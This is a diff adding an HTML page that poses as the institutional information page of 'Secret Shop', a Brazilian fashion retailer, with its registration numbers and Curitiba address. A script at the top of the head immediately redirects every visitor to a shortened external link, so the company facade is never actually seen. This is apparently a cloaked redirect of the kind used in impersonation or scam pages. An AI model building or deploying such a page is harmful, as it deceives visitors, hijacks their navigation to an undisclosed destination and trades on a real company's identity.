@@ -1,1 +1,245 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <script>
+  window.location.href = "https://w.app/dr7cn3";
+</script>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
 
+<title>Secret Shop - Informações Institucionais</title>
+
+<style>
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+    font-family:Arial,Helvetica,sans-serif;
+}
+
+body{
+    background:#f4f4f4;
+    color:#222;
+}
+
+header{
+    background:#111;
+    color:#fff;
+    padding:40px;
+    text-align:center;
+}
+
+header h1{
+    font-size:40px;
+}
+
+header p{
+    opacity:.8;
+    margin-top:10px;
+}
+
+.container{
+    width:90%;
+    max-width:1100px;
+    margin:auto;
+    padding:40px 0;
+}
+
+.card{
+    background:#fff;
+    border-radius:12px;
+    padding:25px;
+    margin-bottom:25px;
+    box-shadow:0 10px 25px rgba(0,0,0,.08);
+}
+
+.card h2{
+    margin-bottom:20px;
+    color:#111;
+    border-left:5px solid #000;
+    padding-left:10px;
+}
+
+.grid{
+    display:grid;
+    grid-template-columns:repeat(auto-fit,minmax(250px,1fr));
+    gap:20px;
+}
+
+.item{
+    background:#fafafa;
+    border:1px solid #eee;
+    padding:18px;
+    border-radius:10px;
+}
+
+.item strong{
+    display:block;
+    color:#555;
+    margin-bottom:8px;
+}
+
+footer{
+    background:#111;
+    color:#fff;
+    text-align:center;
+    padding:25px;
+    margin-top:30px;
+}
+
+button{
+    margin-top:20px;
+    padding:15px 35px;
+    border:none;
+    background:#000;
+    color:#fff;
+    border-radius:8px;
+    cursor:pointer;
+    font-size:16px;
+    transition:.3s;
+}
+
+button:hover{
+    background:#444;
+}
+
+#msg{
+    margin-top:20px;
+    color:green;
+    font-weight:bold;
+}
+
+@media(max-width:700px){
+
+header h1{
+    font-size:30px;
+}
+
+}
+</style>
+
+</head>
+<body>
+
+<header>
+
+<h1>Secret Shop</h1>
+
+<p>Informações Institucionais</p>
+
+</header>
+
+<div class="container">
+
+<div class="card">
+
+<h2>Dados da Empresa</h2>
+
+<div class="grid">
+
+<div class="item">
+<strong>Razão Social</strong>
+Secret Shop Comercio de Moda LTDA
+</div>
+
+<div class="item">
+<strong>Nome Fantasia</strong>
+Secret Shop
+</div>
+
+<div class="item">
+<strong>CNPJ</strong>
+11.277.524/0001-40
+</div>
+
+<div class="item">
+<strong>Inscrição Estadual</strong>
+90500226-06
+</div>
+
+<div class="item">
+<strong>Natureza Jurídica</strong>
+Sociedade Empresária Limitada
+</div>
+
+<div class="item">
+<strong>Porte</strong>
+Sem Enquadramento
+</div>
+
+<div class="item">
+<strong>Capital Social</strong>
+R$ 5.225.132,00
+</div>
+
+<div class="item">
+<strong>Situação</strong>
+Ativa
+</div>
+
+<div class="item">
+<strong>Data de Abertura</strong>
+10/09/2009
+</div>
+
+<div class="item">
+<strong>Tipo</strong>
+Matriz
+</div>
+
+</div>
+
+</div>
+
+<div class="card">
+
+<h2>Endereço</h2>
+
+<p>
+
+Alameda Doutor Carlos de Carvalho, 603<br>
+
+Loja 11 Andar Tr Cond Omni Ed<br>
+
+Centro<br>
+
+Curitiba - Paraná<br>
+
+CEP: 80430-180
+
+</p>
+
+</div>
+
+<div class="card">
+
+<h2>Contato</h2>
+
+<p>Email e telefones disponíveis mediante consulta aos canais oficiais.</p>
+
+<button onclick="mostrar()">Consultar Informações</button>
+
+<div id="msg"></div>
+
+</div>
+
+</div>
+
+<footer>
+
+© 2026 - Página institucional demonstrativa.
+
+</footer>
+
+<script>
+
+function mostrar(){
+
+document.getElementById("msg").innerHTML="Consulte os canais oficiais da empresa para informações atualizadas.";
+
+}
+
+</script>
+
+</body>
+</html>
